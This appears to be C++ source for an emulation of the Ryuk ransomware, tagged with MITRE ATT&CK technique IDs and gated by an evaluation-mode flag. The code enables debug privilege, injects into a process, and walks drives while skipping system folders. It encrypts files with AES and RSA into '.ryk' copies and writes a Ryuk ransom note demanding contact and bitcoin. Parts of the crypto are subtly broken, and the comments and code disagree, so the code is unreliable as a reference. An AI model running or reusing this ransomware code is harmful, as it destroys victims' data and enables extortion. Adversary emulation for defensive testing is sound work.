#include "bat_actions.h"
#include "file_encryption.h"
#include "mount_share_operations.h"
#include "process_inject.h"
#include "se_token.h"
#include <windows.h>
#include <tchar.h>
#include <wincrypt.h>
#include <iostream>
#include <fstream>

namespace ryuk {

    /*
     * This method will identify the logical drives on the system and determine its drive type.
     * Once identified it will begin walking the filesystem for that particular drive.
     *
     *  Arguments:
     *      None
     *
     *  MITRE ATT&CK Techniques:
     *      T1083 - File and Directory Discovery
     *
     *  Returns:
     *      None
    */
    DWORD DiscoveryAndDirectoryWalk(TCHAR* processName)
    {
        const int buffer_size = 512;
        TCHAR tcLogicalNames[buffer_size]{};
        DWORD dwLogicalDrives = 0L;
        DWORD dwInjectedProcessPID = -1L;
        SIZE_T n = 0ui64;
        HANDLE hProcessTokenHandle = INVALID_HANDLE_VALUE;
        BOOL bStateSetPrivilege = FALSE;
        UINT drive_type = 0;
        BOOL evalsMode = TRUE;

        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hProcessTokenHandle))
        {
            _ftprintf_s(stderr, TEXT("Error acquiring OpenProcessToken()\n"));
            return -1;
        }

        if (hProcessTokenHandle != INVALID_HANDLE_VALUE)
        {
            bStateSetPrivilege = ryuk::SetPrivilege(hProcessTokenHandle, SE_DEBUG_NAME, TRUE);

            if (!CloseHandle(hProcessTokenHandle))
            {
                _ftprintf_s(stdout, TEXT("Error in CloseHandle for hProcessTokenHandle...\n"));
                return -2;
            }
        }
        else
        {
            _ftprintf_s(stdout, TEXT("Error acquiring hProcessTokenHandle handle: %u\n"), GetLastError());
            return -3;
        }

        if (bStateSetPrivilege)
        {
            dwInjectedProcessPID = ryuk::InjectProcess(processName);

            if (dwInjectedProcessPID == -1L)
            {
                _ftprintf_s(stderr, TEXT("Error trying to inject process...\n"));
                return -4;
            }

            dwLogicalDrives = GetLogicalDriveStrings(buffer_size, tcLogicalNames);
            if (!dwLogicalDrives)
            {
                _ftprintf_s(stderr, TEXT("Error grabbing logical drives... %u\n"), GetLastError());
                return -5;
            }

            while (n < dwLogicalDrives)
            {
                drive_type = GetDriveType(&tcLogicalNames[n]);

                if (evalsMode)
                {
                    if (_tcscmp(&tcLogicalNames[n], TEXT("C:\\")) == 0)
                    {
                        _ftprintf_s(stdout, TEXT("[T1083] File and Directory Discovery with 'GetLogicalDrives' and 'GetDriveType'... %ls type is %d\n"), &tcLogicalNames[n], drive_type);
                        if (drive_type != DRIVE_CDROM)
                        {
                            ryuk::WalkDrive(dwInjectedProcessPID, TEXT("C:\\Users\\Public\\"), TEXT("*"), nullptr, FALSE);
                        }
                    }
                    else if (_tcscmp(&tcLogicalNames[n], TEXT("Z:\\")) == 0)
                    {
                        _ftprintf_s(stdout, TEXT("[T1083] File and Directory Discovery with 'GetLogicalDrives' and 'GetDriveType'... %ls type is %d\n"), &tcLogicalNames[n], drive_type);
                        if (drive_type != DRIVE_CDROM)
                        {
                            ryuk::WalkDrive(dwInjectedProcessPID, TEXT("Z:\\Users\\Public\\"), TEXT("*"), nullptr, FALSE);
                        }
                    }
                }
                else
                {
                    _ftprintf_s(stdout, TEXT("[T1083] File and Directory Discovery with 'GetLogicalDrives' and 'GetDriveType'... %ls type is %d\n"), &tcLogicalNames[n], drive_type);
                    if (drive_type != DRIVE_CDROM)
                    {
                        ryuk::WalkDrive(dwInjectedProcessPID, &tcLogicalNames[n], TEXT("*"), nullptr, FALSE);
                    }
                }

                n += _tcslen(&tcLogicalNames[n]) + 1;
            }
        }
        else
        {
            _ftprintf_s(stdout, TEXT("Error setting 'SeDebugPrivilege'...\n"));
            return -6;
        }

        return 0;
    }

    /*
     * This method will write the ransom note to the specified directory.
     *
     *  Arguments:
     *      location - A directory to write the ransom note at.
     *
     *  Returns:
     *      True if writing the note was successful. False otherwise.
     */
    BOOL WriteRansomNote(std::wstring location)
    {
        HANDLE hFileHandle = INVALID_HANDLE_VALUE;
        DWORD dwNumberOfBytesWritten;
        const CHAR MESSAGE[] =
            "Your network has been penetrated.\n\n"
            "All files on each host in the network has been encrypted with a strong algorithm.\n\n"
            "Backups were either encrypted or deleted or backup discs were formatted.\n"
            "Shadow copies also removed, so F8 or any other methods may damage encrypted data but not recover.\n\n"
            "We exclusively have decryption software for your situation\n"
            "No decryption software is available in the public.\n\n"
            "DO NOT RESET OR SHUTDOWN - files may be damaged.\n"
            "DO NOT RENAME OR MOVE the encrypted and readme files.\n"
            "DO NOT DELETE the readme files.\n"
            "This may lead to the impossibility of recovery of certain files.\n\n"
            "To get info (decrypt your files) contact us at\n"
            "JohnDoe@malicious.com\n"
            "or\n"
            "JohnDoe@anothermalicious.com\n\n"
            "BTC wallet:\n"
            "1234567890\n\n"
            "Ryuk\n"
            "No system is safe";
        std::wstring filename = location + TEXT("\\RyukReadMe.txt");
        DWORD dwlastError = 0L;

        hFileHandle = CreateFile(
            filename.c_str(),
            GENERIC_READ | GENERIC_WRITE,
            0L,
            NULL,
            CREATE_NEW,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        dwlastError = GetLastError();

        if (dwlastError == ERROR_ALREADY_EXISTS || dwlastError == ERROR_FILE_EXISTS)
        {
            return TRUE;
        }

        if (hFileHandle != INVALID_HANDLE_VALUE)
        {
            if (!WriteFile(hFileHandle, &MESSAGE, sizeof(MESSAGE), &dwNumberOfBytesWritten, nullptr))
            {
                CloseHandle(hFileHandle);
                return FALSE;
            }

            if (!CloseHandle(hFileHandle))
            {
                _ftprintf_s(stderr, TEXT("Error in CloseHandle hFileHandle...\n"));
                return FALSE;
            }

            return TRUE;
        }

        return FALSE;
    }

    /*
     * This method will navigate a particular path, walk each directory and identify all files.
     * If the files end with a particular file extension or directory that is excluded it will not be
     * navigated and subsequently not passed over to the encryption function.
     *
     *  Arguments:
     *      path   - A path to an existing directory on the system (i.e., C:/)
     *      mask   - A mask that is provided to the Windows API to operate in the current directory
     *      files  - A vector of filepaths identified by this algorithm. If insert is False this will
     *               not be populated.
     *      insert - A boolean used to indicate if we want to save the files identified in this drive.
     *
     *  MITRE ATT&CK Techniques:
     *      T1083 - File and Directory Discovery
     *
     *  Returns:
     *      True if we managed to navigate the path given without errors. Otherwise False.
     */
    BOOL WalkDrive(DWORD dwInjectedProcessPID, std::wstring path, std::wstring mask, std::vector<std::wstring>* files, BOOL insert)
    {
        // Excluded extensions... or files
        TCHAR EXT_DLL[] = TEXT(".dll");
        TCHAR EXT_LNK[] = TEXT(".lnk");
        TCHAR EXT_HRMLOG[] = TEXT(".hrmlog");
        TCHAR EXT_INI[] = TEXT(".ini");
        TCHAR EXT_EXE[] = TEXT(".exe");
        TCHAR EXT_BOOT1[] = TEXT("BOOT");
        TCHAR EXT_BOOT2[] = TEXT("boot");
        TCHAR EXT_NTLDR[] = TEXT("ntldr");
        TCHAR EXT_BOOTMGR[] = TEXT("bootmgr");
        TCHAR EXT_NTDETECT[] = TEXT("NTDETECT");
        TCHAR RYUK_README[] = TEXT("RyukReadMe.txt");
        std::vector<TCHAR*> ALL_EXT = {
            EXT_DLL,
            EXT_LNK,
            EXT_HRMLOG,
            EXT_INI,
            EXT_EXE,
            EXT_BOOT1,
            EXT_BOOT2,
            EXT_NTLDR,
            EXT_BOOTMGR,
            EXT_NTDETECT,
            RYUK_README,
        };

        // Excluded folders...
        TCHAR EXC_CHROME[] = TEXT("Chrome");
        TCHAR EXC_MOZILLA[] = TEXT("Mozilla");
        TCHAR EXC_RECYCLE[] = TEXT("$Recycle.Bin");
        TCHAR EXC_WINDOWS1[] = TEXT("Windows");
        TCHAR EXC_WINDOWS2[] = TEXT("WINDOWS");
        TCHAR EXC_WINDOWS3[] = TEXT("\\Windows\\");
        TCHAR EXC_BOOT[] = TEXT("boot");
        TCHAR EXC_SYSVOL1[] = TEXT("SYSVOL");
        TCHAR EXC_SYSVOL2[] = TEXT("sysvol");
        TCHAR EXC_NTDS[] = TEXT("NTDS");
        TCHAR EXC_NETLOGON[] = TEXT("netlogon");
        TCHAR EXC_MICROSOFT[] = TEXT("Microsoft");
        TCHAR EXC_AHNLAB[] = TEXT("AhnLab");
        std::vector<TCHAR*> ALL_EXC = {
            EXC_AHNLAB,
            EXC_BOOT,
            EXC_CHROME,
            EXC_MICROSOFT,
            EXC_MOZILLA,
            EXC_NETLOGON,
            EXC_NTDS,
            EXC_RECYCLE,
            EXC_SYSVOL1,
            EXC_SYSVOL2,
            EXC_WINDOWS1,
            EXC_WINDOWS2,
            EXC_WINDOWS3,
        };

        HANDLE hFindFile = INVALID_HANDLE_VALUE;
        WIN32_FIND_DATA wfdFileData;
        BOOL trigger = FALSE;
        BOOL success = FALSE;
        BOOL firstMessage = TRUE;
        std::stack<std::wstring> directories;
        std::wstring spec;
        std::wstring fileOrDirectoryToEncrypt;
        std::map<HANDLE, LPVOID> processExMemory;

        directories.push(path);
        if (files != nullptr)
        {
            files->clear();
        }

        // While directories to navigate are available, continue
        while (!directories.empty())
        {
            path = directories.top();
            spec = path + TEXT("\\") + mask;
            directories.pop();

            hFindFile = FindFirstFile(spec.c_str(), &wfdFileData);

            if (hFindFile == INVALID_HANDLE_VALUE)
            {
                continue;
            }

            // For each file we find in this directory do...
            do
            {
                // If the filename is not . or ..
                if (_tcscmp(wfdFileData.cFileName, TEXT(".")) != 0 && _tcscmp(wfdFileData.cFileName, TEXT("..")) != 0)
                {
                    fileOrDirectoryToEncrypt = (path + TEXT("\\") + wfdFileData.cFileName);

                    // If the wfdFileData structure is a directory, check if is not excluded, if not add it to our stack
                    if (wfdFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                    {
                        trigger = FALSE;
                        for (std::vector<TCHAR*>::const_iterator it = ALL_EXC.cbegin(); it != ALL_EXC.cend(); ++it)
                        {
                            if (_tcscmp(wfdFileData.cFileName, *it) == 0)
                            {
                                trigger = TRUE;
                                break;
                            }
                        }

                        if (trigger)
                        {
                            continue;
                        }

                        directories.push(fileOrDirectoryToEncrypt);
                    }
                    else
                    {
                        // Then wfdFileData must be a file that we could potentially encrypt, check it is not excluded
                        // add it to our files vector if neccesary and continue.
                        trigger = FALSE;
                        for (std::vector<TCHAR*>::const_iterator it = ALL_EXT.cbegin(); it != ALL_EXT.cend(); ++it)
                        {
                            size_t filelen = _tcslen(wfdFileData.cFileName);
                            size_t extlen = _tcslen(*it);
                            CONST TCHAR* file_extension = &wfdFileData.cFileName[filelen - extlen];

                            if (_tcscmp(file_extension, *it) == 0)
                            {
                                trigger = TRUE;
                                break;
                            }
                        }

                        if (trigger)
                        {
                            continue;
                        }
                        else
                        {
                            if (insert && files != nullptr)
                            {
                                files->push_back(fileOrDirectoryToEncrypt);
                            }

                            success = ryuk::CreateEncryptionThread(dwInjectedProcessPID, fileOrDirectoryToEncrypt.c_str(), fileOrDirectoryToEncrypt.length(), (EncryptionProcedureFunc*)ryuk::EncryptionProcedure, &processExMemory);

                            if (success)
                            {
                                if (firstMessage)
                                {
                                    _ftprintf_s(stdout, TEXT("\t[T1486] Encryption with AES256 and RSA2048 has started for this drive"));
                                    firstMessage = FALSE;
                                }

                                ryuk::WriteRansomNote(path);
                            }
                        }
                    }
                }
            } while (FindNextFile(hFindFile, &wfdFileData));

            if (GetLastError() != ERROR_NO_MORE_FILES)
            {
                FindClose(hFindFile);
                return FALSE;
            }
        }

        _ftprintf_s(stderr, TEXT("\n\t\tStarting cleanup for %zu threads...\n"), processExMemory.size());

        // Finish clearing memory cleanup for injected process.
        if (!processExMemory.empty())
        {
            HANDLE hTargetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwInjectedProcessPID);
            DWORD dwExitCode = 0L;

            if (hTargetProcessHandle)
            {
                while (!processExMemory.empty())
                {
                    Sleep(500);
                    for (std::map<HANDLE, LPVOID>::iterator it = processExMemory.begin(); it != processExMemory.end(); )
                    {
                        if (GetExitCodeThread(it->first, &dwExitCode))
                        {
                            if (dwExitCode != STILL_ACTIVE)
                            {
                                // Exit code -14 means it tried to encrypt a file that was already encrypted.
                                if ((dwExitCode != 0L) && (dwExitCode != -14L))
                                {
                                    _ftprintf_s(stderr, TEXT("EncryptionThread exited with status code %ld\n"), dwExitCode);
                                }
                                if (!VirtualFreeEx(hTargetProcessHandle, it->second, 0L, MEM_RELEASE))
                                {
                                    _ftprintf_s(stderr, TEXT("Error in CreateEncryptionThread::processExMemory::VirtualFreeEx for argumentAddress %u...\n"), GetLastError());
                                }
                                if (!CloseHandle(it->first))
                                {
                                    _ftprintf_s(stderr, TEXT("Error in CreateEncryptionThread::processExMemory::CloseHandle for hTargetProcessHandle %u...\n"), GetLastError());
                                }
                                it = processExMemory.erase(it);
                            }
                            else
                            {
                                it++;
                            }
                        }
                        else
                        {
                            _ftprintf_s(stderr, TEXT("Error in CreateEncryptionThread::GetExitCodeThread %u...\n"), GetLastError());
                            it++;
                        }
                    }
                    _ftprintf_s(stderr, TEXT("\t\tWaiting for %zu threads to finish...\n"), processExMemory.size());
                }

                if (!CloseHandle(hTargetProcessHandle))
                {
                    _ftprintf_s(stderr, TEXT("Error in CloseHandle for hTargetProcessHandle %u...\n"), GetLastError());
                }
            }
            else
            {
                _ftprintf_s(stderr, TEXT("Error in OpenProcess for hTargetProcessHandle %u...\n"), GetLastError());
            }
        }

        // To show the process is running
        _ftprintf_s(stdout, TEXT("Done encrypting this drive.\n"));

        return TRUE;
    }

    /*
     * This is the function in charge of encrypting a file with AES256. It will
     * attempt to identify if the file is already encrypted. It will write the ciphertext in-place,
     * followed by RYUKTM, and the exported encrypted AES256 key using RSA2048.
     *
     *  Arguments:
     *      tFileLocation - A path to an existing file on the system (i.e., C:/somefolder/myfile.txt)
     *
     *  MITRE ATT&CK Techniques:
     *      T1486 - Data Encrypted for Impact
     *
     *  Returns:
     *      0 if the execution of the function was successful. Otherwise error codes are returned
     *      to identify at which area the failure occurred.
     */

    const TCHAR* RYK_FILE_EXTENSION = TEXT(".ryk");

    // Generate AES key
    HCRYPTKEY GenerateAESKey()
    {
        HCRYPTPROV hCryptProv = NULL;
        HCRYPTKEY hAesKey = NULL;

        if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        {
            std::cerr << "Failed to acquire crypto context: " << GetLastError() << std::endl;
            return NULL;
        }

        if (!CryptGenKey(hCryptProv, CALG_AES_256, CRYPT_EXPORTABLE, &hAesKey))
        {
            std::cerr << "Failed to generate AES key: " << GetLastError() << std::endl;
            CryptReleaseContext(hCryptProv, 0);
            return NULL;
        }

        CryptReleaseContext(hCryptProv, 0);

        return hAesKey;
    }

    // Generate RSA key pair
    HCRYPTKEY GenerateRSAKeyPair()
    {
        HCRYPTPROV hCryptProv = NULL;
        HCRYPTKEY hRsaKey = NULL;

        if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        {
            std::cerr << "Failed to acquire crypto context: " << GetLastError() << std::endl;
            return NULL;
        }

        if (!CryptGenKey(hCryptProv, CALG_RSA_KEYX, CRYPT_EXPORTABLE, &hRsaKey))
        {
            std::cerr << "Failed to generate RSA key pair: " << GetLastError() << std::endl;
            CryptReleaseContext(hCryptProv, 0);
            return NULL;
        }

        CryptReleaseContext(hCryptProv, 0);

        return hRsaKey;
    }

    // Read file data into memory
    bool ReadFileData(const TCHAR* tFileLocation, BYTE** ppData, DWORD& dwDataSize)
    {
        std::ifstream file(tFileLocation, std::ios::binary | std::ios::ate);
        if (!file.is_open())
        {
            std::cerr << "Failed to open file: " << tFileLocation << std::endl;
            return false;
        }

        std::streamsize fileSize = file.tellg();
        file.seekg(0, std::ios::beg);

        *ppData = new BYTE[fileSize];
        if (!file.read(reinterpret_cast<char*>(*ppData), fileSize))
        {
            std::cerr << "Failed to read file data: " << tFileLocation << std::endl;
            delete[] * ppData;
            return false;
        }

        file.close();
        dwDataSize = static_cast<DWORD>(fileSize);
        return true;
    }

    // AES encrypt data
    bool AESEncryptData(HCRYPTKEY hAesKey, const BYTE* pData, DWORD dwDataSize, BYTE** ppEncryptedData, DWORD& dwEncryptedDataSize)
    {
        HCRYPTPROV hCryptProv = NULL;
        HCRYPTHASH hHash = NULL;
        DWORD dwBlockSize = 0;
        DWORD dwBufferLen = 0;

        if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        {
            std::cerr << "Failed to acquire crypto context: " << GetLastError() << std::endl;
            return false;
        }

        if (!CryptCreateHash(hCryptProv, CALG_MD5, 0, 0, &hHash))
        {
            std::cerr << "Failed to create hash: " << GetLastError() << std::endl;
            CryptReleaseContext(hCryptProv, 0);
            return false;
        }

        if (!CryptHashData(hHash, pData, dwDataSize, 0))
        {
            std::cerr << "Failed to hash data: " << GetLastError() << std::endl;
            CryptDestroyHash(hHash);
            CryptReleaseContext(hCryptProv, 0);
            return false;
        }

        if (!CryptGetHashParam(hHash, HP_HASHSIZE, reinterpret_cast<BYTE*>(&dwBlockSize), &dwBufferLen, 0))
        {
            std::cerr << "Failed to get hash parameter: " << GetLastError() << std::endl;
            CryptDestroyHash(hHash);
            CryptReleaseContext(hCryptProv, 0);
            return false;
        }

        *ppEncryptedData = new BYTE[dwDataSize + dwBlockSize];
        memcpy(*ppEncryptedData, pData, dwDataSize);

        if (!CryptEncrypt(hAesKey, 0, TRUE, 0, *ppEncryptedData, &dwDataSize, dwDataSize + dwBlockSize))
        {
            std::cerr << "Failed to encrypt data: " << GetLastError() << std::endl;
            CryptDestroyHash(hHash);
            CryptReleaseContext(hCryptProv, 0);
            delete[] * ppEncryptedData;
            return false;
        }

        dwEncryptedDataSize = dwDataSize;

        CryptDestroyHash(hHash);
        CryptReleaseContext(hCryptProv, 0);

        return true;
    }

    bool RSAEncryptAESKey(HCRYPTKEY hRsaKey, HCRYPTKEY hAesKey, BYTE** ppEncryptedKey, DWORD& dwEncryptedKeySize)
    {
        // Determine the size of the RSA key
        DWORD dwRsaKeySize;
        if (!CryptExportKey(hRsaKey, NULL, PUBLICKEYBLOB, 0, NULL, &dwRsaKeySize))
        {
            std::cerr << "Failed to determine RSA key size." << std::endl;
            return false;
        }

        // Allocate memory for the RSA public key
        BYTE* pRsaPublicKey = new BYTE[dwRsaKeySize];

        // Export the RSA public key
        if (!CryptExportKey(hRsaKey, NULL, PUBLICKEYBLOB, 0, pRsaPublicKey, &dwRsaKeySize))
        {
            std::cerr << "Failed to export RSA public key." << std::endl;
            delete[] pRsaPublicKey;
            return false;
        }

        // Create a key exchange blob using the AES key
        BYTE* pKeyExchangeBlob = nullptr;
        DWORD dwKeyExchangeBlobSize = 0;
        if (!CryptExportKey(hAesKey, NULL, PLAINTEXTKEYBLOB, 0, NULL, &dwKeyExchangeBlobSize))
        {
            std::cerr << "Failed to determine AES key exchange blob size." << std::endl;
            delete[] pRsaPublicKey;
            return false;
        }

        pKeyExchangeBlob = new BYTE[dwKeyExchangeBlobSize];
        if (!CryptExportKey(hAesKey, NULL, PLAINTEXTKEYBLOB, 0, pKeyExchangeBlob, &dwKeyExchangeBlobSize))
        {
            std::cerr << "Failed to export AES key exchange blob." << std::endl;
            delete[] pRsaPublicKey;
            delete[] pKeyExchangeBlob;
            return false;
        }

        // Encrypt the AES key exchange blob using RSA public key
        HCRYPTPROV hProv = NULL;
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        {
            std::cerr << "Failed to acquire cryptographic context." << std::endl;
            delete[] pRsaPublicKey;
            delete[] pKeyExchangeBlob;
            return false;
        }

        HCRYPTKEY hRsaPublicKey;
        if (!CryptImportKey(hProv, pRsaPublicKey, dwRsaKeySize, NULL, 0, &hRsaPublicKey))
        {
            std::cerr << "Failed to import RSA public key." << std::endl;
            CryptReleaseContext(hProv, 0);
            delete[] pRsaPublicKey;
            delete[] pKeyExchangeBlob;
            return false;
        }

        DWORD dwEncryptedKeyBufferSize = 0;
        if (!CryptEncrypt(hRsaPublicKey, NULL, TRUE, 0, NULL, &dwEncryptedKeyBufferSize, 0))
        {
            std::cerr << "Failed to determine size of encrypted key buffer." << std::endl;
            CryptDestroyKey(hRsaPublicKey);
            CryptReleaseContext(hProv, 0);
            delete[] pRsaPublicKey;
            delete[] pKeyExchangeBlob;
            return false;
        }

        *ppEncryptedKey = new BYTE[dwEncryptedKeyBufferSize];
        ZeroMemory(*ppEncryptedKey, dwEncryptedKeyBufferSize);

        if (!CryptEncrypt(hRsaPublicKey, NULL, TRUE, 0, *ppEncryptedKey, &dwEncryptedKeyBufferSize, dwEncryptedKeyBufferSize))
        {
            std::cerr << "Failed to encrypt AES key using RSA public key." << std::endl;
            CryptDestroyKey(hRsaPublicKey);
            CryptReleaseContext(hProv, 0);
            delete[] pRsaPublicKey;
            delete[] pKeyExchangeBlob;
            delete[] * ppEncryptedKey;
            return false;
        }

        dwEncryptedKeySize = dwEncryptedKeyBufferSize;

        // Clean up resources
        CryptDestroyKey(hRsaPublicKey);
        CryptReleaseContext(hProv, 0);
        delete[] pRsaPublicKey;
        delete[] pKeyExchangeBlob;

        return true;
    }

    INT EncryptionProcedure(const TCHAR* tFileLocation)
    {
        // Generate AES key
        HCRYPTKEY hAesKey = GenerateAESKey();
        if (hAesKey == NULL)
        {
            std::cerr << "Failed to generate AES key." << std::endl;
            return -1;
        }

        // Generate RSA key pair
        HCRYPTKEY hRsaKey = GenerateRSAKeyPair();
        if (hRsaKey == NULL)
        {
            std::cerr << "Failed to generate RSA key pair." << std::endl;
            CryptDestroyKey(hAesKey);
            return -1;
        }

        // Read the file data
        BYTE* pData = nullptr;
        DWORD dwDataSize = 0;
        if (!ReadFileData(tFileLocation, &pData, dwDataSize))
        {
            std::cerr << "Failed to read file data." << std::endl;
            CryptDestroyKey(hAesKey);
            CryptDestroyKey(hRsaKey);
            return -1;
        }

        // Encrypt the file data using AES
        BYTE* pEncryptedData = nullptr;
        DWORD dwEncryptedDataSize = 0;
        if (!AESEncryptData(hAesKey, pData, dwDataSize, &pEncryptedData, dwEncryptedDataSize))
        {
            std::cerr << "Failed to encrypt file data." << std::endl;
            delete[] pData;
            CryptDestroyKey(hAesKey);
            CryptDestroyKey(hRsaKey);
            return -1;
        }

        // Encrypt the AES key using RSA
        BYTE* pEncryptedKey = nullptr;
        DWORD dwEncryptedKeySize = 0;
        if (!RSAEncryptAESKey(hRsaKey, hAesKey, &pEncryptedKey, dwEncryptedKeySize))
        {
            std::cerr << "Failed to encrypt AES key using RSA." << std::endl;
            delete[] pData;
            delete[] pEncryptedData;
            CryptDestroyKey(hAesKey);
            CryptDestroyKey(hRsaKey);
            return -1;
        }

        // Append the ".ryk" extension to the file name
        TCHAR tEncryptedFile[MAX_PATH];
        _tcscpy_s(tEncryptedFile, tFileLocation);
        _tcscat_s(tEncryptedFile, TEXT(".ryk"));

        // Open the encrypted file for writing
        std::ofstream encryptedFile(tEncryptedFile, std::ios::binary);
        if (!encryptedFile)
        {
            std::cerr << "Failed to open encrypted file for writing." << std::endl;
            delete[] pData;
            delete[] pEncryptedData;
            delete[] pEncryptedKey;
            CryptDestroyKey(hAesKey);
            CryptDestroyKey(hRsaKey);
            return -1;
        }

        // Write the encrypted AES key to the encrypted file
        encryptedFile.write(reinterpret_cast<char*>(&dwEncryptedKeySize), sizeof(DWORD));
        encryptedFile.write(reinterpret_cast<char*>(pEncryptedKey), dwEncryptedKeySize);

        // Write the encrypted data to the encrypted file
        encryptedFile.write(reinterpret_cast<char*>(&dwEncryptedDataSize), sizeof(DWORD));
        encryptedFile.write(reinterpret_cast<char*>(pEncryptedData), dwEncryptedDataSize);

        // Close the encrypted file
        encryptedFile.close();

        // Clean up resources
        delete[] pData;
        delete[] pEncryptedData;
        delete[] pEncryptedKey;
        CryptDestroyKey(hAesKey);
        CryptDestroyKey(hRsaKey);

        return 0;
    }

} // namespace ryuk
